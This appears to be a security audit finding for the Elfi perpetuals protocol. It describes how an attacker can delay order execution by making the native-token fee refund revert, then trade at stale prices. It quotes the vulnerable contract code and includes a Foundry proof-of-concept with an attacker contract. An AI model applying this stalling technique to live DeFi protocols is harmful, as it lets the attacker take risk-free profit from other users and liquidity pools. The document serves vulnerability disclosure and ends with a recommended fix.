Energetic Lemonade Woodpecker

High

# Attacker can game the system by delaying their order execution until price favors them

## Summary
Attacker can delay execution of their order until price favours them.

## Vulnerability Detail
A malicious actor can stall their transactions in the mempool until it favours them before allowing it to execute, with the following steps:
- Create a request with an large `executionFee`, such that the pool will have to [reimburse](https://github.com/sherlock-audit/2024-05-elfi-protocol/blob/8a1a01804a7de7f73a04d794bf6b8104528681ad/elfi-perp-contracts/contracts/process/GasProcess.sol#L36) you with `refundFee` (which is in native token) at the end of the execution call.
- Create this transaction from an address that can't receive native token to prevent the transaction from executing successfully
- When the time is right, toggle your address to be able to receive native token for the Tx to execute. This is achievable with metamorphic and upgradable contracts.


## Impact
- Attacker can execute trade orders with stale prices, effectively making risk free profit.


## Code Snippet
Create a request with an large `executionFee`, such that the pool will have to reimburse you with `refundFee`.
https://github.com/sherlock-audit/2024-05-elfi-protocol/blob/8a1a01804a7de7f73a04d794bf6b8104528681ad/elfi-perp-contracts/contracts/process/GasProcess.sol#L36
```js
function processExecutionFee(PayExecutionFeeParams memory cache) external {
        uint256 usedGas = cache.startGas - gasleft();
        uint256 executionFee = usedGas * tx.gasprice;
        uint256 refundFee;
        uint256 lossFee;
        if (executionFee > cache.userExecutionFee) {
            executionFee = cache.userExecutionFee;
            lossFee = executionFee - cache.userExecutionFee;
        } else {
            refundFee = cache.userExecutionFee - executionFee;
        }
 // ...
        VaultProcess.withdrawEther(cache.keeper, executionFee);
        if (refundFee > 0) {
            VaultProcess.withdrawEther(cache.account, refundFee);
        }
// ...
    }
```

`refundFee` is sent in native token.
https://github.com/sherlock-audit/2024-05-elfi-protocol/blob/8a1a01804a7de7f73a04d794bf6b8104528681ad/elfi-perp-contracts/contracts/process/VaultProcess.sol#L50-L54
```js
    function withdrawEther(address receiver, uint256 amount) internal {
        address wrapperToken = AppConfig.getChainConfig().wrapperToken;
        IWETH(wrapperToken).withdraw(amount);
        safeTransferETH(receiver, amount);
    }

    function safeTransferETH(address to, uint256 value) public {
        (bool success, ) = to.call{ value: value }(new bytes(0));
        require(success, "STE");
    }
```

## Proof of Code

<details>
**How to run the PoC**
- Clone this repo. This is a Foundry version of the original repo.
```bash
git clone https://github.com/Renzo1/Elfi-Foundry2.git
```
- Open `test/README` for guide on how to run the all the PoCs and Test in the Repo
- For this particular PoC, run:
```bash
	forge test --match-test testStallOrder
```

**The PoC*
```js
	contract AttackerCanStallOrder is Test, TargetFunctions, FoundryAsserts {
		Attacker attacker;

		function setUp() public {
			setup();
			attacker = new Attacker(diamondAddress);
		}


		function __mintStakeTokenRequest() internal {
			// Create Mint Params
			uint256 _answer = 50_000;
			BeforeAfterParamHelper memory beAfParams;
			IStake.MintStakeTokenParams memory params;
			beAfParams.oracles = getOracleParam(_answer);

			/// createOrder params setup
			params.stakeToken = stakedTokens[0];
			params.requestToken = address(weth);
			params.requestTokenAmount = 1000e18;
			params.walletRequestTokenAmount = 1000e18;
			params.minStakeAmount = 0;
			params.executionFee = ChainConfig.getMintGasFeeLimit();
			params.isCollateral = false;
			params.isNativeToken = false;

			uint256 requestId = diamondStakeFacet.createMintStakeTokenRequest{value: params.executionFee}(params);
			vm.prank(keeper);
			diamondStakeFacet.executeMintStakeToken(requestId, beAfParams.oracles);
			console2.log("requestId", requestId);
		}


		// forge test --match-test testStallOrder
		function testStallOrder() public {
			uint256 _answer = 50_000;
			BeforeAfterParamHelper memory beAfParams;
			IOrder.PlaceOrderParams memory params;
			beAfParams.oracles = getOracleParam(_answer);


			/// createOrder params setup
			params.symbol = MarketConfig.getWethSymbol();
			params.isCrossMargin = false;
			params.isNativeToken = false;
			params.orderSide = Order.Side.LONG;
			params.posSide = Order.PositionSide.INCREASE;
			params.orderType = Order.Type.MARKET;
			params.stopType = Order.StopType.NONE;
			params.marginToken = address(weth);
			params.qty = 0;
			params.orderMargin = 10e18;
			params.leverage = MarketConfig.getMaxLeverage() / 2;
			params.triggerPrice = 0; // triggerPrice 
			params.acceptablePrice = uint256(beAfParams.oracles[0].maxPrice);
			params.executionFee = ChainConfig.getPlaceIncreaseOrderGasFeeLimit() * 2; // Using excessive gas fee so that a portion will be refunded
			params.placeTime = block.timestamp;

			// Deal attacker some balance
			vm.startPrank(keeper); // keeper is also the admin in this example
			hevm.deal(address(attacker), TradeConfig.getEthInitialAllowance() * 1000); // Sets the eth balance of user to amt
			weth.mint(address(attacker), (TradeConfig.getWethInitialAllowance() * 1000) * (10 ** weth.decimals())); // Sets the weth balance of user to amt
			vm.stopPrank();

			vm.prank(USERS[0]);
			uint256 orderId = attacker.createOrder{value: params.executionFee}(params);
			console2.log(orderId);

			__mintStakeTokenRequest();
			vm.expectRevert();
			diamondOrderFacet.executeOrder(orderId, beAfParams.oracles);
		}
	}

	contract Attacker {
		IOrder diamondOrderFacet;

		constructor(address _diamond) {
			diamondOrderFacet =IOrder(_diamond);
		}

		function createOrder(IOrder.PlaceOrderParams memory params) public payable returns(uint256 orderId) {
			// Set allowance for diamond address
			IERC20(params.marginToken).approve(address(diamondOrderFacet), type(uint256).max);

			return diamondOrderFacet.createOrderRequest{value: msg.value}(params);
		}

		// No fallback or receive function
		// receive() external payable {} // toggle for test to fail with "Reason: call did not revert as expected"
	}

```
</details>


## Tool used
Manual Review


## Recommendation
Send `refundfee` fee in ERC20 token.